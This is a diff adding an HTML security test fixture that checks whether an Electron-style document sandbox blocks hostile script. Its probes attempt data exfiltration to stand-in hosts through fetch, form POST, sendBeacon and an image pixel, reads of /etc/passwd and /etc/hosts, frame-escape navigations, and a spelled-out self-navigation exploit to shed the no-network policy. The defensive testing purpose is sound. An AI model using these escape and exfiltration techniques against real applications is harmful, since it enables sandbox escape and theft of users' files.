@@ -1,0 +1,241 @@
+<!doctype html>
+<!--
+  ============================ SECURITY TEST FIXTURE ============================
+  This file is DELIBERATELY HOSTILE. It is not a document, a demo, or example code
+  to copy. Its inline script ATTEMPTS the things a malicious or model-generated
+  HTML artifact would try if Koda's document sandbox were weak:
+
+    1. fetch() to an external origin
+    2. navigation of window.top / window.parent out of the artifact
+    3. Node reachability probes (require, process, module, global, Buffer)
+    4. Electron/IPC surface probes (window.koda, electron, ipcRenderer, __electron_preload__)
+    5. XMLHttpRequest against file:// (local project file read)
+    6. form-action exfiltration, window.open, sendBeacon, and an external <img> pixel
+    7. storage and cookie access
+    8. self-navigation off the document origin: read the frame's own host, strip the `doc-`
+       prefix, and navigate the frame ITSELF to the guessed app-preview origin — which serves
+       with no CSP — to shed the document's no-network policy
+
+  EVERY ATTEMPT MUST FAIL in a correct sandbox. The page records one row per probe
+  with data-outcome="blocked", "attempted", or "ALLOWED"; a passing security test
+  asserts that no row is ALLOWED, that body[data-state] reaches "settled", and that
+  each "attempted" row had no effect. The "attempted" rows are the four escapes a
+  browser drops without a usable in-frame signal: navigating top or parent and the
+  form's target=_top submit (dropped silently), and sendBeacon (returns `true`
+  optimistically even when CSP blocks the send). Only the harness outside the frame,
+  plus the response CSP the fixture cannot read, can prove they did nothing (see
+  probeAttempt below).
+
+  There are no real secrets and no real endpoints here. Every host is under
+  `.invalid.example`, which cannot resolve, so the fixture is inert even if it is
+  ever opened outside a sandbox.
+  ==============================================================================
+-->
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Hostile artifact (security fixture)</title>
+    <style>
+      body { font: 14px/1.5 ui-monospace, SFMono-Regular, Menlo, monospace; padding: 24px; max-width: 780px; }
+      h1 { font-size: 16px; }
+      table { border-collapse: collapse; width: 100%; }
+      td { border-bottom: 1px solid #ccc; padding: 6px 8px; vertical-align: top; }
+      tr[data-outcome='ALLOWED'] { background: #ffe0e0; font-weight: 700; }
+      td.detail { color: #666; font-size: 12px; }
+    </style>
+  </head>
+  <body data-state="pending">
+    <h1>Hostile artifact — every row below must read "blocked"</h1>
+    <table><tbody id="rows"></tbody></table>
+
+    <!-- Declarative exfiltration attempt: a form aimed off-origin, plus a target that escapes a frame. -->
+    <form id="exfil" action="https://collector.invalid.example/collect" method="POST" target="_top">
+      <input type="hidden" name="stolen" value="fixture-value-not-a-secret" />
+    </form>
+
+    <script>
+      const rows = document.getElementById('rows')
+      const results = []
+      window.__kodaHostileResults = results
+
+      function record(name, outcome, detail) {
+        results.push({ name, outcome, detail: String(detail).slice(0, 200) })
+        const tr = document.createElement('tr')
+        tr.setAttribute('data-probe', name)
+        tr.setAttribute('data-outcome', outcome)
+        const a = document.createElement('td')
+        a.textContent = name
+        const b = document.createElement('td')
+        b.textContent = outcome
+        const c = document.createElement('td')
+        c.className = 'detail'
+        c.textContent = String(detail).slice(0, 200)
+        tr.append(a, b, c)
+        rows.appendChild(tr)
+      }
+
+      // A probe is "blocked" when it throws, rejects, or errors out. Anything that completes
+      // successfully is a real escape and is recorded in screaming caps.
+      function probe(name, fn) {
+        try {
+          const value = fn()
+          record(name, 'ALLOWED', value === undefined ? 'completed' : value)
+        } catch (err) {
+          record(name, 'blocked', (err && err.message) || err)
+        }
+      }
+
+      function probeAsync(name, fn) {
+        return Promise.resolve()
+          .then(fn)
+          .then((value) => record(name, 'ALLOWED', value === undefined ? 'completed' : value))
+          .catch((err) => record(name, 'blocked', (err && err.message) || err))
+      }
+
+      // Some escapes cannot be judged from in here. A sandboxed navigation of top/parent, a form
+      // submission, and a CSP-blocked sendBeacon are all dropped without a usable signal — either no
+      // exception at all, or a return value the browser reports OPTIMISTICALLY (sendBeacon returns
+      // `true` even when CSP blocks the send). Reading those as "ALLOWED" reports an escape that did
+      // not happen; reading them as "blocked" claims proof this page does not have. They record
+      // "attempted"; the containment they can't prove is proven elsewhere — the harness outside the
+      // frame sees Koda's window never moved, and the response CSP (unit-tested) denies the network.
+      function probeAttempt(name, fn) {
+        try {
+          fn()
+          record(name, 'attempted', 'no exception; effect must be checked from outside the frame')
+        } catch (err) {
+          record(name, 'blocked', (err && err.message) || err)
+        }
+      }
+
+      // 1. Node reachability.
+      probe('require', () => typeof require === 'function' ? require('fs').readdirSync('/') .length + ' entries' : (() => { throw new Error('require is not defined') })())
+      probe('process', () => typeof process !== 'undefined' ? 'pid ' + process.pid : (() => { throw new Error('process is not defined') })())
+      probe('module', () => typeof module !== 'undefined' ? 'module object present' : (() => { throw new Error('module is not defined') })())
+      probe('global', () => typeof global !== 'undefined' ? 'global object present' : (() => { throw new Error('global is not defined') })())
+      probe('Buffer', () => typeof Buffer !== 'undefined' ? 'Buffer present' : (() => { throw new Error('Buffer is not defined') })())
+
+      // 2. Electron / preload / IPC surface.
+      probe('window.koda', () => window.koda ? Object.keys(window.koda).join(',') : (() => { throw new Error('no window.koda') })())
+      probe('window.electron', () => window.electron ? 'electron bridge present' : (() => { throw new Error('no window.electron') })())
+      probe('ipcRenderer', () => {
+        const ipc = (window.electron && window.electron.ipcRenderer) || window.ipcRenderer
+        if (!ipc) throw new Error('no ipcRenderer')
+        ipc.send('doc:read', { path: '/etc/passwd' })
+        return 'ipc send accepted'
+      })
+      probe('preload globals', () => {
+        // Named exactly, not matched loosely: an /electron|preload|node|koda/i sweep hits the ordinary
+        // DOM `Node`, `NodeList`, `NodeFilter` and `NodeIterator` interfaces, so a correctly sandboxed
+        // frame would report an escape it never made.
+        const PRIVILEGED =
+          /^(?:koda|electron|ipcRenderer|require|process|module|global|globalThisNode|Buffer|__electron_preload__|nodeRequire|webFrame)$/
+        const hit = Object.getOwnPropertyNames(window).filter((k) => PRIVILEGED.test(k))
+        if (hit.length === 0) throw new Error('no privileged globals exposed')
+        return hit.join(',')
+      })
+
+      // 3. Escaping the frame.
+      probe('read top.location', () => window.top.location.href)
+      // Both are silently dropped, not thrown: same-origin policy PERMITS a cross-origin
+      // location.replace / location assignment (they are on the tiny cross-origin-writable allowlist),
+      // and the sandbox then blocks the actual top-level navigation with only a console warning. So
+      // neither call throws and neither returns a signal — "blocked" and "ALLOWED" are both lies from
+      // in here. They record the attempt; the harness outside the frame proves nothing moved.
+      probeAttempt('navigate top', () => {
+        window.top.location = 'https://takeover.invalid.example/'
+      })
+      probeAttempt('navigate parent', () => {
+        window.parent.location.replace('https://takeover.invalid.example/')
+      })
+      probe('window.open', () => {
+        const w = window.open('https://popup.invalid.example/', '_blank')
+        if (!w) throw new Error('window.open returned null')
+        return 'popup opened'
+      })
+      probeAttempt('form exfil', () => {
+        document.getElementById('exfil').submit()
+      })
+
+      // 4. Storage and cookies.
+      probe('localStorage', () => {
+        localStorage.setItem('koda-hostile', '1')
+        return 'wrote localStorage'
+      })
+      probe('cookie', () => {
+        document.cookie = 'koda-hostile=1'
+        if (!document.cookie.includes('koda-hostile')) throw new Error('cookie rejected')
+        return document.cookie
+      })
+
+      // 5. Network. `.invalid.example` cannot resolve, so these are inert even unsandboxed.
+      const pending = [
+        probeAsync('fetch external', () =>
+          fetch('https://collector.invalid.example/collect', {
+            method: 'POST',
+            mode: 'cors',
+            body: 'fixture-value-not-a-secret',
+          }).then((r) => 'status ' + r.status),
+        ),
+        probeAsync('xhr file://', () =>
+          new Promise((resolve, reject) => {
+            const xhr = new XMLHttpRequest()
+            xhr.open('GET', 'file:///etc/hosts')
+            xhr.onload = () => resolve('read ' + xhr.responseText.length + ' bytes')
+            xhr.onerror = () => reject(new Error('xhr blocked'))
+            xhr.send()
+          }),
+        ),
+        // sendBeacon is the fourth silently-unprovable escape (see probeAttempt): navigator.sendBeacon
+        // returns a boolean, and Chromium returns `true` OPTIMISTICALLY even when CSP connect-src
+        // blocks the actual send — the return value is not proof of delivery. The real block is
+        // `default-src 'none'` (asserted in preview.test.ts) plus an unresolvable host, so this records
+        // the attempt rather than reading its own return as an escape.
+        Promise.resolve().then(() =>
+          probeAttempt('sendBeacon', () => {
+            if (navigator.sendBeacon)
+              navigator.sendBeacon('https://collector.invalid.example/beacon', 'fixture-value-not-a-secret')
+          }),
+        ),
+        new Promise((resolve) => {
+          const img = new Image()
+          const done = (outcome, detail) => {
+            record('external image', outcome, detail)
+            resolve()
+          }
+          img.onload = () => done('ALLOWED', 'pixel loaded')
+          img.onerror = () => done('blocked', 'pixel failed to load')
+          setTimeout(() => done('blocked', 'pixel never loaded'), 4000)
+          img.src = 'https://tracker.invalid.example/px.gif'
+        }),
+      ]
+
+      // The doc→app-preview self-navigation escape. Fired LAST, after the recorded contract is settled
+      // and readable, so the harness can read the table first and then observe that the frame never
+      // moved. Like the top/parent navigations this gives no in-frame signal (a cancelled navigation
+      // does not throw), so it records "attempted"; the harness outside the frame proves the frame
+      // stayed on its `doc-` origin, and the response CSP proves no network was regained.
+      function attemptSelfNav() {
+        probeAttempt('self-nav app-preview', () => {
+          const host = location.hostname
+          if (!host.startsWith('doc-')) throw new Error('not on the document origin')
+          // Two-line exploit: recover the app-preview host from our own, then navigate the frame itself.
+          const target = location.protocol + '//' + host.slice('doc-'.length) + location.pathname
+          document.body.setAttribute('data-selfnav-target', target)
+          document.body.setAttribute('data-selfnav', 'attempted')
+          location.href = target
+        })
+      }
+
+      Promise.all(pending).then(() => {
+        // Record + attempt the self-navigation BEFORE announcing settled, so its row is already in the
+        // table when the harness reads it. `location.href` schedules the navigation asynchronously, so
+        // the lines below still run on this document; a correct sandbox then cancels the navigation.
+        attemptSelfNav()
+        const escaped = results.filter((r) => r.outcome === 'ALLOWED')
+        document.body.setAttribute('data-escaped', String(escaped.length))
+        document.body.setAttribute('data-state', 'settled')
+      })
+    </script>
+  </body>
+</html>
